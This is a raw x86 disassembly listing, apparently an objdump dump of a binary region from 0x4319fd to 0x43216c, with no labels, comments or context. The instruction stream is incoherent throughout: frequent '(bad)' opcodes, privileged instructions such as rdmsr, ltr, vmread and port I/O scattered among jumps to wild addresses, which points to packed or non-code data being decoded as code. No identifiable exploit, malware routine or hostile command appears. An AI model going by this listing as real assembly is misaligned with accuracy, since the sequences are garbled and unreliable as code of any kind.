  4319fd:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431a07:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  431a0d:	jnp    0x74439f15
  431a13:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a19:	add    BYTE PTR [edi],cl
  431a1b:	mov    edi,DWORD PTR [ecx-0x78]
  431a1e:	ltr    WORD PTR [ecx-0x7b]
  431a22:	dec    DWORD PTR [edi]
  431a24:	clc    
  431a25:	out    0x45,eax
  431a27:	add    BYTE PTR [eax],cl
  431a29:	cmp    ebx,0xffffff8c
  431a2c:	jge    0x431a2e
  431a2e:	jb     0x431a40
  431a30:	je     0x521ab0
  431a36:	pop    edx
  431a37:	push   esi
  431a38:	mov    ecx,DWORD PTR [edi]
  431a3a:	in     al,dx
  431a3b:	rol    DWORD PTR [ebp+0x0],1
  431a3e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431a45:	cmp    DWORD PTR [ecx],0xfffffff0
  431a48:	hlt    
  431a49:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431a4f:	(bad)  
  431a51:	push   eax
  431a52:	jns    0xb842fed0
  431a58:	lock push cs
  431a5a:	ror    edx,0x3
  431a5d:	test   BYTE PTR [ecx+0x5500e800],cl
  431a63:	dec    eax
  431a64:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431a68:	(bad)  
  431a69:	mov    esi,0x7f33ff5f
  431a6e:	inc    eax
  431a6f:	test   DWORD PTR [edx],eax
  431a71:	je     0x431a33
  431a73:	mov    ecx,ecx
  431a75:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431a79:	and    eax,DWORD PTR [eax+0xf0103]
  431a7f:	jp     0x431a6d
  431a81:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431a85:	add    edx,DWORD PTR [edi+0x74]
  431a88:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431a8e:	add    BYTE PTR [ebp-0x74c48bbb],al
  431a94:	je     0x431a19
  431a96:	cmp    eax,edi
  431a98:	js     0x431abd
  431a9a:	add    eax,0xeb0fc003
  431a9f:	jns    0x431a2c
  431aa1:	vmread DWORD PTR [ecx+0x45],ebx
  431aa5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431aab:	adc    al,0x8b
  431aad:	jge    0x431ac3
  431aaf:	mov    edi,DWORD PTR [eax-0x4]
  431ab2:	add    edi,DWORD PTR [edi]
  431ab4:	or     bh,bh
  431ab6:	push   ebp
  431ab7:	push   es
  431ab8:	mov    DWORD PTR [ebp-0x4],ebx
  431abb:	add    edi,esi
  431abd:	pop    es
  431abe:	add    esi,DWORD PTR [edi-0x48ccf183]
  431ac4:	mov    DWORD PTR [esp+esi*8],ecx
  431ac7:	inc    ebp
  431ac8:	pop    ebp
  431ac9:	xor    DWORD PTR [esi-0x4],0x3b
  431acd:	add    edx,DWORD PTR [ecx+edi*1]
  431ad0:	push   es
  431ad1:	clc    
  431ad2:	mov    bh,0xdb
  431ad4:	jp     0x431a8d
  431ad6:	add    cl,BYTE PTR [esi]
  431ad8:	div    DWORD PTR [edi+0x4d8b0c1c]
  431ade:	test   edi,edi
  431ae0:	je     0x431ad6
  431ae2:	mov    eax,ecx
  431ae4:	or     BYTE PTR [ebx],al
  431ae6:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431aec:	jbe    0x431b60
  431aee:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431af4:	add    ecx,DWORD PTR [esi]
  431af6:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431afc:	add    eax,DWORD PTR [ebx-0x287af783]
  431b02:	je     0x431b51
  431b04:	mov    DWORD PTR [ecx],edi
  431b06:	mov    esi,eax
  431b08:	hlt    
  431b09:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431b10:	jb     0x431ad2
  431b12:	jmp    0x431aff
  431b14:	xor    esi,DWORD PTR [ebx]
  431b16:	pop    edi
  431b17:	pop    esi
  431b18:	pop    ebx
  431b19:	ret    
  431b1a:	ret    0x8b
  431b1d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b23:	xor    DWORD PTR [ecx],0xc
  431b26:	pushf  
  431b27:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b2d:	rdmsr  
  431b2f:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431b36:	dec    ebp
  431b37:	ret    
  431b38:	mov    edi,DWORD PTR [esi-0x4]
  431b3b:	pop    eax
  431b3c:	dec    ebp
  431b3d:	jne    0x431aca
  431b3f:	xor    edi,esp
  431b41:	inc    eax
  431b42:	dec    ebp
  431b43:	jbe    0x431b98
  431b45:	inc    eax
  431b46:	pop    ebp
  431b47:	add    edx,DWORD PTR [esi+0x8]
  431b4a:	push   esp
  431b4b:	dec    eax
  431b4c:	push   ecx
  431b4d:	mov    eax,edi
  431b4f:	and    al,0xf0
  431b51:	jo     0x431b3e
  431b53:	mov    eax,DWORD PTR [ebx]
  431b55:	sbb    BYTE PTR [ebp+0x4d],cl
  431b58:	mov    eax,DWORD PTR [ebx]
  431b5a:	nop
  431b5b:	or     BYTE PTR [eax],al
  431b5d:	jne    0x431bb6
  431b5f:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431b65:	cld    
  431b66:	xor    edi,edi
  431b68:	add    edi,DWORD PTR [ebp+0x3]
  431b6b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431b71:	js     0x431af7
  431b73:	jae    0x431b77
  431b75:	(bad)  
  431b77:	xor    al,0x5d
  431b79:	jmp    0x431b06
  431b7b:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431b82:	fdecstp 
  431b84:	test   BYTE PTR [edi],ah
  431b86:	add    bh,BYTE PTR [ebp+0x0]
  431b89:	add    ebx,DWORD PTR [ebp-0x77]
  431b8c:	mov    edi,eax
  431b8e:	cmp    al,0x0
  431b91:	adc    dh,BYTE PTR [ebx]
  431b93:	jge    0x431b98
  431b95:	mov    edi,DWORD PTR [ebx]
  431b97:	jl     0x431ba8
  431b99:	clc    
  431b9a:	dec    edi
  431b9b:	jge    0x431b9d
  431b9d:	mov    eax,DWORD PTR [ebx]
  431b9f:	jb     0x431ba9
  431ba1:	mov    ecx,DWORD PTR [ebp-0x8]
  431ba4:	mov    edi,edi
  431ba6:	xor    edx,DWORD PTR [eax]
  431ba8:	add    edi,DWORD PTR [ebx]
  431baa:	mov    DWORD PTR [ebp-0x10],edi
  431bad:	inc    edi
  431bae:	pop    ebp
  431baf:	jge    0x431bec
  431bb1:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431bb5:	mov    edx,0xc05d87f0
  431bba:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431bbe:	fimul  WORD PTR [eax]
  431bc0:	fist   WORD PTR [ebp+0x1c]
  431bc3:	in     al,dx
  431bc4:	jne    0x431bb2
  431bc6:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431bcc:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431bd0:	fdivp  st(0),st
  431bd2:	fild   WORD PTR [ebp+0x4510f85c]
  431bd8:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431bde:	inc    ebp
  431bdf:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431be5:	mov    ebp,DWORD PTR [ebx-0x4]
  431be8:	adc    al,0x8b
  431bea:	rcl    DWORD PTR [eax],0x48
  431bed:	mov    esi,0x7080803
  431bf2:	fiadd  WORD PTR [ebp+0x4d]
  431bf5:	(bad)  
  431bf6:	mov    edx,DWORD PTR [edx-0x4]
  431bf9:	mov    edx,DWORD PTR [ebp-0x4]
  431bfc:	xor    ebx,DWORD PTR [ebx+0x330103]
  431c02:	mov    DWORD PTR [edi+0x872dc],edi
  431c08:	xlat   BYTE PTR ds:[ebx]
  431c09:	into   
  431c0a:	ffreep st(6)
  431c0c:	retf   0x6c7
  431c0f:	iret   
  431c10:	dec    ebp
  431c11:	inc    ebp
  431c12:	mov    DWORD PTR [ebx],edi
  431c14:	fmul   QWORD PTR [edi]
  431c16:	dec    ebp
  431c17:	jnp    0x431c4c
  431c19:	add    BYTE PTR [ebx],al
  431c1b:	mov    ecx,DWORD PTR [esp+edi*8]
  431c1e:	inc    ebp
  431c1f:	dec    ebp
  431c20:	lea    esi,[ebx]
  431c22:	add    DWORD PTR [ebx],eax
  431c24:	jb     0x431c61
  431c26:	add    BYTE PTR [edi],cl
  431c28:	inc    ebp
  431c29:	imul   eax,edi,0x858bd800
  431c2f:	cld    
  431c30:	clc    
  431c31:	mov    DWORD PTR [ebp+0x0],eax
  431c34:	inc    DWORD PTR [eax]
  431c36:	or     al,0xde
  431c38:	sbb    bh,0x1
  431c3b:	retf   
  431c3c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431c43:	dec    ebp
  431c44:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431c4a:	enter  0x12de,0xdf
  431c4e:	inc    ebp
  431c4f:	pop    ebp
  431c50:	dec    DWORD PTR [ebx-0x257f0ff4]
  431c56:	add    DWORD PTR [edx],edx
  431c58:	add    BYTE PTR [ebp+0x50],dl
  431c5b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431c61:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431c67:	or     ah,al
  431c69:	pop    ss
  431c6a:	cdq    
  431c6b:	push   ebp
  431c6c:	clc    
  431c6d:	mov    eax,DWORD PTR [ebp-0x4]
  431c70:	xor    edx,edx
  431c72:	add    esi,DWORD PTR [ebx]
  431c74:	cmp    eax,DWORD PTR [ebx]
  431c76:	hlt    
  431c77:	cmp    DWORD PTR [ebx],esp
  431c79:	or     al,BYTE PTR [ebp+0xf]
  431c7c:	mov    eax,DWORD PTR [edx]
  431c7e:	loopne 0x431c80
  431c80:	(bad)  
  431c81:	mov    ecx,esi
  431c83:	cld    
  431c84:	pushf  
  431c85:	pop    ebp
  431c86:	fwait
  431c87:	mov    esi,DWORD PTR [edx]
  431c89:	lock mov eax,eax
  431c8c:	adc    BYTE PTR [ebx],al
  431c8e:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431c95:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431c9b:	dec    ebp
  431c9c:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431ca2:	(bad)  
  431ca3:	iret   
  431ca4:	inc    ebp
  431ca5:	(bad)  
  431ca6:	jne    0x431cf5
  431ca8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431cae:	(bad)  
  431caf:	cmp    ebx,eax
  431cb1:	je     0x431c39
  431cb3:	add    edi,edi
  431cb5:	or     bh,bh
  431cb7:	dec    ebp
  431cb8:	inc    ebp
  431cb9:	mov    esi,DWORD PTR [ebx]
  431cbb:	cld    
  431cbc:	add    ecx,esi
  431cbe:	cmp    ecx,DWORD PTR [eax-0xc]
  431cc1:	mov    edx,DWORD PTR [edi]
  431cc3:	or     BYTE PTR [ebp-0x7c],al
  431cc6:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431ccc:	test   BYTE PTR [ebx+ebx*4],cl
  431ccf:	inc    ebp
  431cd0:	xor    bh,BYTE PTR [esi]
  431cd2:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431cd9:	jne    0x431ca2
  431cdb:	mov    ebp,esp
  431cdd:	fcomp  DWORD PTR [ebx]
  431cdf:	add    BYTE PTR [ecx],al
  431ce1:	inc    DWORD PTR [ebp-0x75]
  431ce4:	(bad)  
  431ce5:	cld    
  431ce6:	add    al,0xce
  431ce8:	mov    ecx,edi
  431cea:	cld    
  431ceb:	inc    ebp
  431cec:	fidivr WORD PTR [ebx]
  431cee:	fbstp  TBYTE PTR [ebp-0x3e]
  431cf1:	mov    eax,DWORD PTR [eax]
  431cf3:	adc    BYTE PTR [ebx-0x3974038b],cl
  431cf9:	fadd   st,st(7)
  431cfb:	add    BYTE PTR [ebp-0x1],al
  431cfe:	mov    ecx,DWORD PTR [esp+edi*8]
  431d01:	inc    ebp
  431d02:	mov    bh,0xc7
  431d05:	loopne 0x431d4c
  431d07:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431d0d:	sbb    dh,BYTE PTR [ebx]
  431d0f:	pushf  
  431d10:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d16:	mov    eax,edi
  431d18:	cwde   
  431d19:	inc    ebp
  431d1a:	inc    ebp
  431d1b:	jne    0x431ca8
  431d1d:	mov    esp,esp
  431d1f:	clc    
  431d20:	add    al,0x4d
  431d22:	mov    DWORD PTR [ebx],esi
  431d24:	or     al,0x33
  431d26:	inc    ebp
  431d27:	lea    ecx,[ebx-0x398d13fd]
  431d2d:	add    bh,al
  431d2f:	inc    ebp
  431d30:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431d37:	add    ebp,esp
  431d39:	shufps xmm1,xmm3,0xc7
  431d3d:	(bad)  
  431d3e:	jmp    0x74885867
  431d43:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431d49:	hlt    
  431d4a:	mov    ecx,DWORD PTR [edi]
  431d4c:	fadd   DWORD PTR [ebp+0x0]
  431d4f:	xor    ecx,DWORD PTR [edi]
  431d51:	add    ecx,ecx
  431d53:	cmp    edi,edi
  431d55:	pmuludq mm7,QWORD PTR [edx+0x50]
  431d59:	(bad)  
  431d5a:	jmp    0x431ce7
  431d5c:	mov    edi,esp
  431d5e:	or     al,0xc6
  431d60:	inc    ebp
  431d61:	(bad)  
  431d62:	mov    eax,DWORD PTR [ebp+0x10]
  431d65:	jne    0x431cf0
  431d67:	mov    eax,DWORD PTR [ecx]
  431d69:	clc    
  431d6a:	add    BYTE PTR [ebp-0x40],cl
  431d6d:	xor    edx,DWORD PTR [eax-0x73]
  431d70:	jne    0x431d73
  431d72:	push   DWORD PTR [edx+0x8]
  431d75:	add    BYTE PTR [ebp+0x45],al
  431d78:	mov    ebp,ecx
  431d7a:	cld    
  431d7b:	add    BYTE PTR [ebp+0x0],cl
  431d7e:	xor    eax,DWORD PTR [ebp+0x3]
  431d81:	mov    DWORD PTR [ebx],edi
  431d83:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431d89:	sub    eax,0x5d330e4d
  431d8e:	lea    esi,[ebx]
  431d90:	add    DWORD PTR [ebx],eax
  431d92:	jb     0x431d7d
  431d94:	add    BYTE PTR [eax],al
  431d96:	inc    ebp
  431d97:	add    bl,ch
  431d99:	inc    ebp
  431d9a:	mov    esi,DWORD PTR [ebx]
  431d9c:	or     al,0x3
  431d9e:	(bad)  
  431d9f:	mov    edi,eax
  431da1:	in     al,dx
  431da2:	scas   eax,DWORD PTR es:[edi]
  431da3:	inc    ebp
  431da4:	mov    esi,DWORD PTR [ebx]
  431da6:	in     al,0x3
  431da8:	add    al,0x89
  431daa:	mov    ecx,DWORD PTR [eax+edi*8]
  431dad:	dec    ebp
  431dae:	(bad)  
  431daf:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431db6:	mov    ecx,eax
  431db8:	cld    
  431db9:	push   es
  431dba:	dec    ebp
  431dbb:	add    al,0x33
  431dbd:	mov    DWORD PTR [ebx],eax
  431dbf:	in     al,dx
  431dc0:	cmp    DWORD PTR [ebp-0x67],eax
  431dc3:	mov    eax,DWORD PTR [ebp-0xba0068]
  431dc9:	mov    edx,DWORD PTR [ebp-0x4]
  431dcc:	mov    ecx,DWORD PTR [ebp-0x2c]
  431dcf:	xor    eax,DWORD PTR [ebp+0x3]
  431dd2:	cmp    DWORD PTR [ebx],0x8b32749a
  431dd8:	xor    edi,esp
  431dda:	jmp    0xff771b2c
  431ddf:	add    ecx,DWORD PTR [ebp-0x3f]
  431de2:	xor    ebx,DWORD PTR [edi]
  431de4:	add    eax,ecx
  431de6:	cmp    ebx,DWORD PTR [eax]
  431de8:	mov    ecx,DWORD PTR [ebp-0x4]
  431deb:	mov    ecx,DWORD PTR [eax]
  431ded:	adc    BYTE PTR [ebp-0x80],al
  431df0:	jmp    0x431df3
  431df2:	mov    eax,DWORD PTR [eax]
  431df4:	cld    
  431df5:	mov    bh,0xc6
  431df7:	push   ecx
  431df8:	(bad)  
  431df9:	jne    0x431e59
  431dfb:	dec    ecx
  431dfd:	or     BYTE PTR [ecx+ebx*1],cl
  431e00:	push   ebp
  431e01:	inc    ebp
  431e02:	in     al,dx
  431e03:	add    ebp,esp
  431e05:	or     bh,al
  431e07:	dec    ebp
  431e08:	cld    
  431e09:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431e0f:	xor    DWORD PTR [edx],0x2
  431e12:	pushf  
  431e13:	dec    DWORD PTR [ebx+0x45510cf4]
  431e19:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e1f:	mov    edx,DWORD PTR [ecx+0xc]
  431e22:	xor    eax,esi
  431e24:	mov    edx,0xc172c7
  431e29:	inc    ebp
  431e2a:	mov    esi,DWORD PTR [ebp+0x8]
  431e2d:	mov    eax,edx
  431e2f:	call   0x84c7e524
  431e34:	add    DWORD PTR [ebx-0x76bace00],ebx
  431e3a:	mov    ebp,eax
  431e3c:	or     BYTE PTR [eax],dl
  431e3e:	jo     0x431e8d
  431e40:	push   edi
  431e41:	xor    esi,DWORD PTR [ebp+0x3]
  431e44:	(bad)  
  431e45:	pmulhuw mm0,mm1
  431e48:	test   DWORD PTR [ebp-0x8],ecx
  431e4b:	mov    DWORD PTR [ebp-0x67],eax
  431e4e:	mov    eax,DWORD PTR [ebp-0x4]
  431e51:	xor    edi,DWORD PTR [ebp-0x73]
  431e54:	xor    eax,DWORD PTR [ebx]
  431e56:	xor    esi,DWORD PTR [edx+0x3]
  431e59:	add    BYTE PTR [ecx],bh
  431e5b:	inc    ebp
  431e5c:	(bad)  
  431e5d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431e63:	mov    DWORD PTR [eax],0x750f0004
  431e69:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431e6f:	lock add BYTE PTR [ebp+0x0],cl
  431e73:	mov    esi,DWORD PTR [ebp-0x18]
  431e76:	mov    ebp,edx
  431e78:	or     al,0x72
  431e7a:	ja     0x431e7c
  431e7c:	mov    edx,esi
  431e7e:	cld    
  431e7f:	(bad)  
  431e82:	cli    
  431e83:	mov    esi,DWORD PTR [ebp-0x4]
  431e86:	cmp    ecx,esi
  431e88:	bswap  edi
  431e8a:	(bad)
  431e8e:	mov    esi,DWORD PTR [ebp-0x4]
  431e91:	mov    esi,ecx
  431e93:	clc    
  431e94:	repnz add esi,DWORD PTR [ebp+0x45]
  431e98:	push   ebx
  431e99:	xor    eax,DWORD PTR [ebp+0x3]
  431e9c:	cmp    al,0x5f
  431e9e:	pushf  
  431e9f:	pop    ebx
  431ea0:	jmp    0x431f67
  431ea5:	mov    esi,DWORD PTR [ebp-0x7d]
  431ea8:	xor    ebp,DWORD PTR [eax]
  431eaa:	lea    eax,[ebp-0x8]
  431ead:	xor    edx,esi
  431eaf:	pushf  
  431eb0:	out    dx,eax
  431eb1:	(bad)  
  431eb2:	neg    eax
  431eb4:	ins    DWORD PTR es:[edi],dx
  431eb5:	test   esi,edi
  431eb7:	clc    
  431eb8:	pop    esp
  431eb9:	inc    ebp
  431eba:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431ec0:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431ec6:	add    cl,al
  431ec8:	jne    0x431e65
  431eca:	mov    esi,DWORD PTR [edx]
  431ecc:	in     al,dx
  431ecd:	push   esi
  431ece:	xor    BYTE PTR [ebp-0xe],dh
  431ed1:	add    edi,esi
  431ed3:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431ed9:	add    cl,bh
  431edb:	mov    edi,DWORD PTR [ebp+0x8]
  431ede:	mov    DWORD PTR [ebp-0x14],esi
  431ee1:	add    esi,DWORD PTR [ebp+0x3c]
  431ee4:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431eea:	mov    ah,0x3e
  431eec:	fwait
  431eed:	pushf  
  431eee:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431ef4:	jne    0x431e81
  431ef6:	mov    ecx,DWORD PTR [esp+ebp*8]
  431ef9:	icebp  
  431efa:	icebp  
  431efb:	shl    edx,0xf2
  431efe:	(bad)  
  431eff:	mov    ah,0x16
  431f01:	push   eax
  431f02:	jne    0x431e97
  431f04:	mov    ecx,DWORD PTR [edi]
  431f06:	in     al,dx
  431f07:	jmp    0x431efa
  431f09:	add    dl,dh
  431f0b:	mov    edi,esi
  431f0d:	or     al,0x8
  431f0f:	inc    ebp
  431f10:	jne    0x431f15
  431f12:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f18:	ret    
  431f19:	or     bh,bh
  431f1b:	jge    0x431f05
  431f1d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f23:	xor    edi,eax
  431f25:	add    esi,DWORD PTR [ebp-0x77]
  431f28:	mov    ebx,esp
  431f2a:	clc    
  431f2b:	neg    DWORD PTR [ebp-0x7c]
  431f2e:	xor    eax,DWORD PTR [eax]
  431f30:	cmp    eax,DWORD PTR [eax]
  431f32:	repz jne 0x431eca
  431f35:	xor    eax,DWORD PTR [ecx]
  431f37:	add    ebx,DWORD PTR [eax]
  431f39:	mov    DWORD PTR [ebp-0x8],eax
  431f3c:	mov    eax,edi
  431f3e:	cld    
  431f3f:	lock pop eax
  431f41:	test   DWORD PTR [ebx],esi
  431f43:	clc    
  431f44:	add    edx,DWORD PTR [edi-0x740bff77]
  431f4a:	fdivp  st(4),st
  431f4c:	test   ecx,esi
  431f4e:	(bad)  
  431f4f:	jnp    0x431f50
  431f51:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431f57:	jae    0x431ee4
  431f59:	sub    edi,esp
  431f5b:	(bad)  
  431f5c:	shl    DWORD PTR [eax-0x3e],0x89
  431f60:	leave  
  431f61:	call   0x8198d66e
  431f66:	in     al,dx
  431f67:	(bad)  
  431f68:	in     al,dx
  431f69:	add    bh,al
  431f6b:	mov    esp,edi
  431f6d:	in     al,dx
  431f6e:	test   DWORD PTR [ebp-0x8],edi
  431f71:	mov    eax,DWORD PTR [ebp+0x2b]
  431f74:	xor    al,BYTE PTR [ebx]
  431f76:	pushf  
  431f77:	jnp    0x57321bb0
  431f7d:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431f81:	loopne 0x431fb6
  431f83:	jne    0x431f40
  431f85:	mov    esi,DWORD PTR [edx-0x20]
  431f88:	add    BYTE PTR [ebp-0x3d],bh
  431f8b:	xor    eax,DWORD PTR [ebp-0x73]
  431f8e:	mov    edi,DWORD PTR [esi]
  431f90:	cld    
  431f91:	jb     0x431f59
  431f93:	add    bl,al
  431f95:	jne    0x431fdc
  431f97:	mov    edx,DWORD PTR [edi-0x10]
  431f9a:	jge    0x432019
  431f9c:	mov    esi,DWORD PTR [ebx]
  431f9e:	lock add ecx,DWORD PTR [ebp+0x3b]
  431fa2:	xor    esi,DWORD PTR [ebp-0x77]
  431fa5:	mov    esi,eax
  431fa7:	lock inc ebp
  431fa9:	jge    0x431fdc
  431fab:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431fb2:	dec    ebp
  431fb3:	mov    esi,DWORD PTR [ebx]
  431fb5:	loopne 0x431f40
  431fb7:	jge    0x431fb1
  431fb9:	add    DWORD PTR [ebp-0x7d],eax
  431fbc:	icebp  
  431fbd:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431fc4:	dec    ebp
  431fc5:	hlt    
  431fc6:	xor    ebx,DWORD PTR [ebp-0x77]
  431fc9:	mov    esi,esp
  431fcb:	in     al,0x45
  431fcd:	jge    0x43200c
  431fcf:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431fd6:	dec    ebp
  431fd7:	push   esp
  431fd8:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431fde:	inc    ebp
  431fdf:	hlt    
  431fe0:	xor    DWORD PTR [ebp-0x61],esi
  431fe3:	mov    edi,DWORD PTR [eax+0xf19504]
  431fe9:	repnz mov DWORD PTR [ebp+0x20],ebx
  431fed:	cmp    eax,DWORD PTR [ebp+0xf]
  431ff0:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ff4:	fistp  WORD PTR [ebx+0x0]
  431ff7:	inc    ebp
  431ff8:	mov    ebx,DWORD PTR [edi+0xc]
  431ffb:	add    eax,eax
  431ffd:	inc    ebp
  431ffe:	test   BYTE PTR [ebx],dh
  432000:	add    eax,DWORD PTR [ebx]
  432002:	add    BYTE PTR [esi+0x45],bl
  432005:	ret    0x85
  432008:	jnp    0x5443a3d7
  43200e:	inc    bp
  432010:	inc    ebp
  432011:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432017:	fdiv   QWORD PTR [ebx]
  432019:	test   DWORD PTR [ecx+0x453bf8],edi
  43201f:	push   ebx
  432020:	add    edi,DWORD PTR [esi+0x708088b]
  432026:	cmp    esi,eax
  432028:	setnp  BYTE PTR [ecx-0x74fcffce]
  43202f:	mov    esp,edi
  432031:	call   0x33ce6583
  432036:	or     BYTE PTR [ebx],al
  432038:	inc    ecx
  432039:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  43203f:	and    BYTE PTR [ebp-0x7074f0bb],al
  432045:	lock add cl,al
  432048:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  43204f:	mov    ch,0x45
  432051:	clc    
  432052:	xor    eax,DWORD PTR [ebp+0x3]
  432055:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  43205b:	inc    ebp
  43205c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  432062:	mov    edi,eax
  432064:	mov    eax,DWORD PTR [ebp+0x3c]
  432067:	mov    ecx,DWORD PTR [eax]
  432069:	hlt    
  43206a:	inc    ebp
  43206b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  432072:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432078:	push   ebp
  432079:	mov    edi,DWORD PTR [ebx]
  43207b:	in     al,dx
  43207c:	jne    0x43203f
  43207e:	mov    eax,DWORD PTR [ebp-0x28]
  432081:	add    DWORD PTR [eax],0xe8058dec
  432087:	clc    
  432088:	mov    esi,DWORD PTR [edi-0x8]
  43208b:	add    dh,dl
  43208d:	rol    WORD PTR [ebp-0x1],cl
  432091:	mov    edx,DWORD PTR [eax+0x8]
  432094:	jne    0x432056
  432096:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  43209d:	inc    ebp
  43209e:	push   esp
  43209f:	test   DWORD PTR [ecx+0xf],ecx
  4320a2:	sub    edx,esp
  4320a4:	add    eax,DWORD PTR [eax]
  4320a6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4320ac:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  4320b3:	mov    eax,DWORD PTR [ecx]
  4320b5:	and    BYTE PTR [eax],al
  4320b7:	cmp    al,0x10
  4320b9:	add    BYTE PTR [ebp+0x66],al
  4320bc:	inc    ecx
  4320be:	push   esp
  4320bf:	add    dh,BYTE PTR [ebp+0x0]
  4320c2:	push   edx
  4320c3:	enterw 0xc1,0x4d
  4320c8:	mov    esp,DWORD PTR [esi+0x20]
  4320cb:	add    DWORD PTR [ecx-0x7b],eax
  4320ce:	add    eax,DWORD PTR [ebx]
  4320d0:	str    WORD PTR [eax+0x45]
  4320d4:	lea    ecx,[ebx+0x45890801]
  4320da:	sbb    BYTE PTR [ebx],al
  4320dc:	dec    ebp
  4320dd:	cmp    al,0xf
  4320df:	inc    ebp
  4320e0:	push   eax
  4320e1:	mov    esi,DWORD PTR [ebx]
  4320e3:	push   eax
  4320e4:	add    eax,eax
  4320e6:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  4320ed:	inc    ebp
  4320ee:	add    BYTE PTR [ecx],dh
  4320f0:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  4320f7:	(bad)  
  4320f8:	mov    ebx,eax
  4320fa:	loopne 0x432141
  4320fc:	dec    ebp
  4320fd:	mov    ecx,DWORD PTR [edi]
  4320ff:	cld    
  432100:	push   eax
  432101:	xchg   DWORD PTR [ebx],esi
  432103:	add    DWORD PTR [ebx],ebp
  432105:	add    BYTE PTR [ebx],ch
  432107:	or     BYTE PTR [ecx],bh
  432109:	dec    ecx
  43210a:	loopne 0x43210f
  43210c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432112:	push   ebp
  432113:	add    DWORD PTR [ebx+0x55100800],eax
  432119:	dec    ebp
  43211a:	jmp    0x4320a5
  43211c:	mov    esp,DWORD PTR [eax]
  43211e:	sbb    dl,dl
  432120:	inc    eax
  432121:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432127:	add    BYTE PTR [ebx+0x74528555],cl
  43212d:	push   ebp
  43212e:	div    DWORD PTR [ebx]
  432130:	and    eax,DWORD PTR [ebx]
  432132:	add    edx,DWORD PTR [edx-0x30]
  432135:	jno    0x4320c2
  432137:	inc    DWORD PTR [eax+eiz*1]
  43213a:	inc    ebp
  43213b:	push   eax
  43213c:	push   eax
  43213d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  432143:	mov    edi,esp
  432145:	push   eax
  432146:	inc    ebp
  432147:	enter  0x458b,0x8
  43214b:	push   ecx
  43214c:	(bad)  
  43214d:	call   0x10d2b25
  432152:	pop    ss
  432153:	push   ebp
  432154:	mov    ecx,DWORD PTR [ebx+0x489408]
  43215a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432160:	push   ecx
  432161:	jo     0x43214b
  432163:	inc    DWORD PTR [edi]
  432165:	or     BYTE PTR [eax],al
  432167:	call   0xce28b1
  43216c:	fmul   QWORD PTR [ebp+0x55]
